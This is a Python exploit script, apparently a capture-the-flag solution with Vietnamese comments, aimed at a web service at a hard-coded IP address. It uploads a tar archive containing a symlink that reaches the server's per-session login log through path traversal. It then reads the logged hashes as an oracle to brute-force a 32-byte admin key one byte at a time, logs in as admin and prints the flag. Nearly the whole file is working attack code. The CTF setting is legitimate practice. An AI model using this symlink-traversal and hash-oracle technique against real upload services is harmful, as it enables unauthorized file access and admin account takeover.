import requests
import tarfile
import os
import hashlib
import time
import urllib.parse
import sys


BASE_URL = "http://124.197.22.141:5050"  
USERNAME = "mthz72"              
PASSWORD = "mthz72"

s = requests.Session()

def register_and_login():
    print("[*] ...")
    try:
        s.post(f"{BASE_URL}/api/register", json={"username": USERNAME, "password": PASSWORD})
    except: pass
    
    res = s.post(f"{BASE_URL}/api/login", json={"username": USERNAME, "password": PASSWORD})
    if res.status_code != 200:
        print("[-] Login failed:", res.text)
        sys.exit(1)
        
    sid_cookie = s.cookies.get('sid')
    if not sid_cookie:
        print("[-] Couldn't get Cookie SID")
        sys.exit(1)
    return sid_cookie

def upload_symlink(sid):
    # Giải mã SID
    decoded_sid = urllib.parse.unquote(sid)
    if decoded_sid.startswith('s:'):
        real_session_id = decoded_sid[2:].split('.')[0]
    else:
        real_session_id = decoded_sid
        
    print(f"[*] Target Session Log Dir: {real_session_id}")

    link_target = f"../../../logs/{real_session_id}/login.logs"
    
    link_name = "doc_log"
    tar_name = "exploit.tar"

    with tarfile.open(tar_name, "w") as tar:
        info = tarfile.TarInfo(name=link_name)
        info.type = tarfile.SYMTYPE 
        info.linkname = link_target
        info.size = 0
        info.mtime = time.time()
        info.mode = 0o777
        tar.addfile(info)

    try:
        with open(tar_name, 'rb') as f:
            files = {'archive': (tar_name, f, 'application/x-tar')}
            res = s.post(f"{BASE_URL}/api/upload", files=files)
            
        if os.path.exists(tar_name): os.remove(tar_name)

        if res.status_code != 200:
            print("[-] Upload thất bại:", res.text)
            sys.exit(1)
            
        return res.json()['extractionId'], link_name

    except Exception as e:
        print("[-] Lỗi upload:", e)
        if os.path.exists(tar_name): 
            try: 
                os.remove(tar_name) 
            except: pass
        sys.exit(1)

def solve():
    sid = register_and_login()
    extract_id, link_name = upload_symlink(sid)
    
    known_secret = bytearray()
    TARGET_LENGTH = 32 
    
    print("\n[*] Oracle Attacking (Byte-by-Byte)...")
    
    for i in range(TARGET_LENGTH):
        payload = b'\x00' * (i + 1)
        
        # Trigger Log
        s.post(f"{BASE_URL}/api/login", json={
            "username": "admin",
            "password": "any",
            "adminKeyInp": payload.decode('latin1')
        })
        
        # Log read
        target_hash = None
        for _ in range(3):
            res = s.get(f"{BASE_URL}/api/file", params={
                "extractionId": extract_id,
                "file": link_name
            })
            
            if res.status_code != 200:
                print(f"   [!] Lỗi đọc file log (Code {res.status_code}): {res.text[:50]}...")
                time.sleep(0.5)
                continue

            lines = res.text.strip().split('\n')
            if lines and 'admin:' in lines[-1]:
                last_line = lines[-1]
                # Format: "DATE - admin:HASH"
                parts = last_line.split('admin:')
                if len(parts) > 1:
                    target_hash = parts[1].strip()
                    break
            time.sleep(0.2)
        
        if not target_hash:
            print(f"[-] Couldn't get hash from log at byte {i}. Check symlink!")
            return

        # Brute Force Local
        found_byte = None
        for candidate in range(256):
            current_secret_guess = known_secret + bytes([candidate])
            xor_res = bytes([x ^ y for x, y in zip(payload, current_secret_guess)])
            calc_hash = hashlib.sha256(xor_res).hexdigest()
            
            if calc_hash == target_hash:
                found_byte = candidate
                break
        
        if found_byte is not None:
            known_secret.append(found_byte)
            
            print(f"\r[+] Found {i+1}/{TARGET_LENGTH}: {known_secret.hex()}", end='', flush=True)
        else:
            print(f"\n[-] Error hash at byte {i}!")
            print(f"    Target Hash: {target_hash}")
            return

    final_secret = known_secret.decode('latin1')
    print(f"\n\n[+] FULL SECRET: {final_secret}")
    
    # 4. Lấy cờ
    print("[*] Logging in as Admin...")
    res = s.post(f"{BASE_URL}/api/login", json={
        "username": "admin",
        "password": "any", 
        "adminKeyInp": final_secret
    })
    
    if res.status_code == 200:
        flag_res = s.get(f"{BASE_URL}/admin")
        print(f"\n>>> FLAG: {flag_res.json().get('flag')} <<<\n")
    else:
        print("[-] Logging in as admin failed.")

if __name__ == "__main__":
    solve()